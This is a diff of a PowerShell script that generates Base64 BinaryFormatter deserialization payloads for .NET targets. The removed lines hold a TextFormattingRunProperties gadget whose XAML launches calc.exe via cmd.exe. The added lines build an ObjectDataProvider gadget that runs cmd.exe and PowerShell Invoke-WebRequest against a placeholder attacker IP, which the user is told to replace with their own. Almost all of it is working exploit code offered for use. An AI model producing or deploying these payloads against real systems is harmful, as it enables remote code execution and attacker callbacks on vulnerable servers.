@@ -1,67 +1,37 @@
-# 1. Load the required assemblies
+# 1. Load the required assembly
 Add-Type -AssemblyName PresentationFramework
-Add-Type -AssemblyName WindowsBase
-Add-Type -AssemblyName System.Xaml
 
-# 2. Define the C# payload generator using the TextFormattingRunProperties gadget
-$csharpCode = @"
-using System;
-using System.IO;
-using System.Runtime.Serialization;
-using System.Runtime.Serialization.Formatters.Binary;
-using System.Text;
+# 2. Define your attacker IP and the URL
+$attackerIP = "192.168.1.100" # <--- CHANGE THIS TO YOUR IP
+$targetURL = "http://$attackerIP/"
 
-[Serializable]
-public class TextFormattingRunPropertiesMarshal : ISerializable
-{
-    protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context) { }
-    string _xaml;
-    public void GetObjectData(SerializationInfo info, StreamingContext context)
-    {
-        info.SetType(typeof(Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties));
-        info.AddValue("ForegroundBrush", _xaml);
-    }
-    public TextFormattingRunPropertiesMarshal(string xaml) { _xaml = xaml; }
-}
+# 3. Create the ObjectDataProvider gadget
+$odp = New-Object System.Windows.Data.ObjectDataProvider
 
-public class PayloadGenerator
-{
-    public static string Generate()
-    {
-        // 1. Define the malicious XAML payload
-        string xamlPayload = @"
-<ResourceDictionary
-    xmlns='http://schemas.microsoft.com/winfx/2006/xaml/presentation'
-    xmlns:x='http://schemas.microsoft.com/winfx/2006/xaml'
-    xmlns:System='clr-namespace:System;assembly=mscorlib'
-    xmlns:Diag='clr-namespace:System.Diagnostics;assembly=System'>
-    <ObjectDataProvider x:Key='obj' ObjectType='{x:Type Diag:Process}' MethodName='Start'>
-        <ObjectDataProvider.MethodParameters>
-            <System:String>cmd.exe</System:String>
-            <System:String>/c calc.exe</System:String>
-        </ObjectDataProvider.MethodParameters>
-    </ObjectDataProvider>
-</ResourceDictionary>";
+# 4. Set the ObjectType (NOT ObjectInstance) to invoke a static method
+$odp.ObjectType = [System.Diagnostics.Process]
 
-        // 2. Create the marshal object
-        var marshal = new TextFormattingRunPropertiesMarshal(xamlPayload);
+# 5. Add MethodParameters BEFORE setting MethodName (Order is critical)
+$odp.MethodParameters.Add("cmd.exe")
 
-        // 3. Serialize with BinaryFormatter
-        BinaryFormatter formatter = new BinaryFormatter();
-        using (MemoryStream ms = new MemoryStream())
-        {
-            formatter.Serialize(ms, marshal);
-            return Convert.ToBase64String(ms.ToArray());
-        }
-    }
-}
-"@
+# The command: cmd.exe /c powershell.exe -c "Invoke-WebRequest -Uri http://<IP>/ -UseBasicParsing"
+$command = "/c powershell.exe -c ""Invoke-WebRequest -Uri $targetURL -UseBasicParsing"""
+$odp.MethodParameters.Add($command)
 
-# 3. Compile the C# code
-Add-Type -TypeDefinition $csharpCode -ReferencedAssemblies PresentationFramework, WindowsBase, System.Xaml
+# 6. Set the MethodName
+$odp.MethodName = "Start"
 
-# 4. Execute the generator
-$base64Payload = [PayloadGenerator]::Generate()
+# 7. Serialize the gadget using BinaryFormatter
+$formatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+$memStream = New-Object System.IO.MemoryStream
+$formatter.Serialize($memStream, $odp)
 
-Write-Host "Base64 BinaryFormatter Payload (TextFormattingRunProperties Gadget):" -ForegroundColor Green
+# 8. Convert the serialized bytes to a Base64 string
+$base64Payload = [System.Convert]::ToBase64String($memStream.ToArray())
+
+# 9. Output the payload
+Write-Host "Base64 Payload (HTTP Request to $attackerIP):" -ForegroundColor Green
 Write-Host $base64Payload
+
+# Clean up
+$memStream.Dispose()
